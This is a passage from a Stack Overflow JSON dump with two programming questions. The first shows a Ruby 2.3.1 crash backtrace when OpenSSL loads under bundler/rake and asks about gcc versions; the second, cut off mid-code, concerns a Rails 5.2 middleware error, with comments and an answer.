~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:17\nc:0045 p:0027 s:0178 e:000177 TOP    ~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:16 [FINISH]\nc:0044 p:---- s:0176 e:000175 CFUNC  :require\nc:0043 p:0071 s:0172 e:000171 TOP    ~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl.rb:21 [FINISH]\nc:0042 p:---- s:0170 e:000169 CFUNC  :require\nc:0041 p:0017 s:0166 e:000165 TOP    ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rest-client-2.0.1/lib/restclient.rb:2 [FINISH]\nc:0040 p:---- s:0164 e:000163 CFUNC  :require\nc:0039 p:0023 s:0160 e:000159 TOP    ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rest-client-2.0.1/lib/rest-client.rb:2 [FINISH]\nc:0038 p:---- s:0158 e:000157 CFUNC  :require\nc:0037 p:0042 s:0154 e:000153 BLOCK  ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:81 [FINISH]\nc:0036 p:---- s:0150 e:000149 CFUNC  :each\nc:0035 p:0062 s:0147 e:000146 BLOCK  ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:76 [FINISH]\nc:0034 p:---- s:0141 e:000140 CFUNC  :each\nc:0033 p:0038 s:0138 e:000137 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:65\nc:0032 p:0019 s:0134 e:000133 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler.rb:114\nc:0031 p:0131 s:0130 e:000129 TOP    ~/Projects/projectname/mod_finance/config/boot.rb:8 [FINISH]\nc:0030 p:---- s:0128 e:000127 CFUNC  :require\nc:0029 p:0044 s:0124 e:000123 TOP    ~/Projects/projectname/mod_finance/Rakefile:12 [FINISH]\nc:0028 p:---- s:0122 e:000121 CFUNC  :load\nc:0027 p:0010 s:0118 e:000117 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/rake_module.rb:28\nc:0026 p:0199 s:0114 e:000113 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:689\nc:0025 p:0008 s:0109 e:000108 BLOCK  ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:94\nc:0024 p:0006 s:0107 e:000106 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:176\nc:0023 p:0009 s:0103 e:000102 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:93\nc:0022 p:0015 s:0100 e:000099 BLOCK  ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:77\nc:0021 p:0006 s:0098 e:000097 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:176\nc:0020 p:0009 s:0094 e:000093 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:75\nc:0019 p:0045 s:0091 e:000090 TOP    ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/bin/rake:33 [FINISH]\nc:0018 p:---- s:0089 e:000088 CFUNC  :load\nc:0017 p:0147 s:0085 e:000084 TOP    ~/.rbenv/versions/2.3.1/bin/rake:23 [FINISH]\nc:0016 p:---- s:0081 e:000080 CFUNC  :load\nc:0015 p:0148 s:0077 e:000076 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli/exec.rb:74\nc:0014 p:0089 s:0069 e:000068 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli/exec.rb:28\nc:0013 p:0032 s:0065 e:000064 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli.rb:424\nc:0012 p:0078 s:0061 e:000060 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor/command.rb:27\nc:0011 p:0058 s:0054 e:000053 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor/invocation.rb:126\nc:0010 p:0305 s:0048 e:000047 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor.rb:387\nc:0009 p:0012 s:0036 e:000035 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli.rb:27\nc:0008 p:0070 s:0032 e:000031 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor/base.rb:466\nc:0007 p:0012 s:0026 e:000025 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli.rb:18\nc:0006 p:0090 s:0021 e:000020 BLOCK  ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/exe/bundle:30\nc:0005 p:0006 s:0016 e:000015 METHOD ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/friendly_errors.rb:124\nc:0004 p:0056 s:0012 E:000750 TOP    ~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/exe/bundle:22 [FINISH]\nc:0003 p:---- s:0010 e:000009 CFUNC  :load\nc:0002 p:0147 s:0006 E:0007a0 EVAL   ~/.rbenv/versions/2.3.1/bin/bundle:23 [FINISH]\nc:0001 p:0000 s:0002 E:000f20 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n~/.rbenv/versions/2.3.1/bin/bundle:23:in `&lt;main&gt;'\n~/.rbenv/versions/2.3.1/bin/bundle:23:in `load'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/exe/bundle:22:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/friendly_errors.rb:124:in `with_friendly_errors'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/exe/bundle:30:in `block in &lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli.rb:18:in `start'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor/base.rb:466:in `start'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli.rb:27:in `dispatch'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor.rb:387:in `dispatch'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor/invocation.rb:126:in `invoke_command'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/vendor/thor/lib/thor/command.rb:27:in `run'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli.rb:424:in `exec'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli/exec.rb:28:in `run'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli/exec.rb:74:in `kernel_load'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/cli/exec.rb:74:in `load'\n~/.rbenv/versions/2.3.1/bin/rake:23:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/bin/rake:23:in `load'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/bin/rake:33:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:75:in `run'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:176:in `standard_exception_handling'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:77:in `block in run'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:93:in `load_rakefile'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:176:in `standard_exception_handling'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:94:in `block in load_rakefile'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/application.rb:689:in `raw_load_rakefile'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/rake_module.rb:28:in `load_rakefile'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rake-10.5.0/lib/rake/rake_module.rb:28:in `load'\n~/Projects/projectname/mod_finance/Rakefile:12:in `&lt;top (required)&gt;'\n~/Projects/projectname/mod_finance/Rakefile:12:in `require'\n~/Projects/projectname/mod_finance/config/boot.rb:8:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler.rb:114:in `require'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:65:in `require'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:65:in `each'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:76:in `block in require'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:76:in `each'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:81:in `block (2 levels) in require'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.16.2/lib/bundler/runtime.rb:81:in `require'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rest-client-2.0.1/lib/rest-client.rb:2:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rest-client-2.0.1/lib/rest-client.rb:2:in `require'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rest-client-2.0.1/lib/restclient.rb:2:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rest-client-2.0.1/lib/restclient.rb:2:in `require'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl.rb:21:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl.rb:21:in `require'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:16:in `&lt;top (required)&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:17:in `&lt;module:OpenSSL&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:18:in `&lt;module:SSL&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:67:in `&lt;class:SSLContext&gt;'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:67:in `new'\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:67:in `initialize'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007fb1f24c4604 RBP: 0x000055ec996d73c0 RSP: 0x00007ffe6120db78\n RAX: 0x0000000000000000 RBX: 0x0000000000000018 RCX: 0x00007fb1ed4830f8\n RDX: 0x0000000000000008 RDI: 0x00007ffe6120d690 RSI: 0x0000000000000000\n  R8: 0x00007fb1ed263f40  R9: 0x0000000000000000 R10: 0x000000000000003f\n R11: 0x00007fb1f24d3470 R12: 0x0000000000000000 R13: 0x0000000000000008\n R14: 0x000055ec9993ccc8 R15: 0x000055ec9994ab20 EFL: 0x0000000000010206\n\n-- C level backtrace information -------------------------------------------\n~/.rbenv/versions/2.3.1/bin/ruby(rb_vm_bugreport+0x535) [0x55ec97169e75] vm_dump.c:688\n~/.rbenv/versions/2.3.1/bin/ruby(rb_bug_context+0xd1) [0x55ec97146cb1] error.c:435\n~/.rbenv/versions/2.3.1/bin/ruby(sigsegv+0x3e) [0x55ec970405ae] signal.c:890\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7fb1f5ccb890]\n/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1(OPENSSL_sk_set+0x14) [0x7fb1f24c4604]\n/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1(CRYPTO_set_ex_data+0x8f) [0x7fb1f246d3cf]\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/x86_64-linux/openssl.so(ossl_x509store_initialize+0x5d) [0x7fb1ed263f9d] ossl_x509store.c:133\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call0_body.constprop.119+0x280) [0x55ec970cc950] vm_eval.c:131\n~/.rbenv/versions/2.3.1/bin/ruby(rb_call0+0xc7) [0x55ec970ccf27] vm_eval.c:61\n~/.rbenv/versions/2.3.1/bin/ruby(rb_class_new_instance+0x21) [0x55ec96fe2381] object.c:1856\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_require_internal+0x630) [0x55ec96f80440] load.c:998\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_require+0x13) [0x55ec96f806b3] load.c:1043\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_require_internal+0x630) [0x55ec96f80440] load.c:998\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_require+0x13) [0x55ec96f806b3] load.c:1043\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_require_internal+0x630) [0x55ec96f80440] load.c:998\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_require+0x13) [0x55ec96f806b3] load.c:1043\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_require_internal+0x630) [0x55ec96f80440] load.c:998\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_require+0x13) [0x55ec96f806b3] load.c:1043\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(invoke_block_from_c_0+0x2be) [0x55ec970cab7e] vm.c:921\n~/.rbenv/versions/2.3.1/bin/ruby(rb_yield+0x5c) [0x55ec970d1a6c] vm.c:988\n~/.rbenv/versions/2.3.1/bin/ruby(rb_ary_each+0x3d) [0x55ec970f2ded] array.c:1815\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x124b) [0x55ec970c53bb] insns.def:964\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(invoke_block_from_c_0+0x2be) [0x55ec970cab7e] vm.c:921\n~/.rbenv/versions/2.3.1/bin/ruby(rb_yield+0x5c) [0x55ec970d1a6c] vm.c:988\n~/.rbenv/versions/2.3.1/bin/ruby(rb_ary_each+0x3d) [0x55ec970f2ded] array.c:1815\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x124b) [0x55ec970c53bb] insns.def:964\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_require_internal+0x630) [0x55ec96f80440] load.c:998\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_require+0x13) [0x55ec96f806b3] load.c:1043\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_load+0x82) [0x55ec96f7efb2] load.c:649\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_load+0x82) [0x55ec96f7efb2] load.c:649\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_load+0x82) [0x55ec96f7efb2] load.c:649\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(rb_load_internal0+0xb9) [0x55ec96f7e929] load.c:619\n~/.rbenv/versions/2.3.1/bin/ruby(rb_f_load+0x82) [0x55ec96f7efb2] load.c:649\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_cfunc+0xf0) [0x55ec970be450] vm_insnhelper.c:1638\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method_each_type+0xb1) [0x55ec970cb001] vm_insnhelper.c:2022\n~/.rbenv/versions/2.3.1/bin/ruby(vm_call_method+0xe3) [0x55ec970cb593] vm_insnhelper.c:2172\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec_core+0x1318) [0x55ec970c5488] insns.def:995\n~/.rbenv/versions/2.3.1/bin/ruby(vm_exec+0x86) [0x55ec970c9ed6] vm.c:1650\n~/.rbenv/versions/2.3.1/bin/ruby(ruby_exec_internal+0xba) [0x55ec96f78bca] eval.c:245\n~/.rbenv/versions/2.3.1/bin/ruby(ruby_run_node+0x2f) [0x55ec96f7c90f] eval.c:310\n~/.rbenv/versions/2.3.1/bin/ruby(main+0x4b) [0x55ec96f787fb] parse.y:7826\n</code></pre>\n\n<p>I've tried many different solutions like installing <strong>libssl1.0-dev</strong> instead of <strong>libssl-dev</strong>, installing ruby with gcc-5 or gcc-6 <code>CC=/usr/bin/gcc-5 rbenv install 2.3.1</code>, etc. and still having this issue.</p>\n\n<p>One thing that helped is </p>\n\n<pre><code>$ CC=/usr/bin/gcc-5 bundle exec rake db:drop\nDropped database 'development_tpay_finance'\nDropped database 'test_tpay_finance'\n</code></pre>\n\n<p>I think the reason is gcc, but how to force ruby to use specific version of gcc?\nMaybe you know any other solutions for this case?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-4", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535368066, "post_id": 52037776, "comment_id": 91026095, "body": "Did you try requiring the file as autoloading may not work in this case? Also why return a JSON error object? The 400 response header tells the client that the request was malformed. I found it a huge antipattern to return response messages for things that end users can&#39;t really do anything about anyways."}, {"owner": {"reputation": 5714, "user_id": 2389501, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/23f6a708c04c660111117c4613592689?s=128&d=identicon&r=PG", "display_name": "Mateusz Urba\u0144ski", "link": "https://stackoverflow.com/users/2389501/mateusz-urba%c5%84ski"}, "reply_to_user": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1535368339, "post_id": 52037776, "comment_id": 91026251, "body": "I tried that but unfortunately it not works."}], "answers": [{"tags": [], "owner": {"reputation": 533, "user_id": 1358698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f813eb3399968848571df028332428d?s=128&d=identicon&r=PG", "display_name": "Tensho", "link": "https://stackoverflow.com/users/1358698/tensho"}, "is_accepted": false, "score": 1, "last_activity_date": 1535402573, "creation_date": 1535402573, "answer_id": 52046702, "question_id": 52037776, "link": "https://stackoverflow.com/questions/52037776/no-such-middleware-to-insert-before-actiondispatchhttpparameters-runtimeer/52046702#52046702", "title": "No such middleware to insert before: ActionDispatch::Http::Parameters (RuntimeError)", "body": "<p>I really don't see <code>ActionDispatch::Http::Parameters</code> middleware at <a href=\"https://guides.rubyonrails.org/rails_on_rack.html#inspecting-middleware-stack\" rel=\"nofollow noreferrer\">official Rails Guide</a> or <a href=\"https://github.com/rails/rails/tree/v5.2.0/actionpack/lib/action_dispatch/middleware\" rel=\"nofollow noreferrer\">GitHub <code>rails</code> repo</a>. There is a module <a href=\"https://github.com/rails/rails/blob/v5.2.0/actionpack/lib/action_dispatch/http/parameters.rb\" rel=\"nofollow noreferrer\"><code>ActionDispatch::Http::Parameters</code></a> and it's just included to <a href=\"https://github.com/rails/rails/blob/v5.2.0/actionpack/lib/action_dispatch/http/request.rb\" rel=\"nofollow noreferrer\"><code>ActionDispatch::Request</code></a> class. I guess as far as Rails (<code>ActionDispatch</code>) request object is ready you are free to verify/adjust it's params, and seems like this place is right after <a href=\"https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/request_id.rb#L25\" rel=\"nofollow noreferrer\"><code>ActionDispatch::RequestId</code></a> middleware.</p>\n"}], "owner": {"reputation": 5714, "user_id": 2389501, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/23f6a708c04c660111117c4613592689?s=128&d=identicon&r=PG", "display_name": "Mateusz Urba\u0144ski", "link": "https://stackoverflow.com/users/2389501/mateusz-urba%c5%84ski"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 640, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1535402573, "creation_date": 1535367509, "question_id": 52037776, "link": "https://stackoverflow.com/questions/52037776/no-such-middleware-to-insert-before-actiondispatchhttpparameters-runtimeer", "title": "No such middleware to insert before: ActionDispatch::Http::Parameters (RuntimeError)", "body": "<p>In my Rails 5.2 app I have the following middleware inside <code>app/middleware</code> folder:</p>\n\n<pre><code>class CatchJsonParseErrors\n  def initialize(app)\n    @app = app\n  end\n\n  def call(env)\n    begin\n      @app.call(env)\n    rescue ActionDispatch::Http::Parameters::ParseError =&gt; error\n      raise error unless 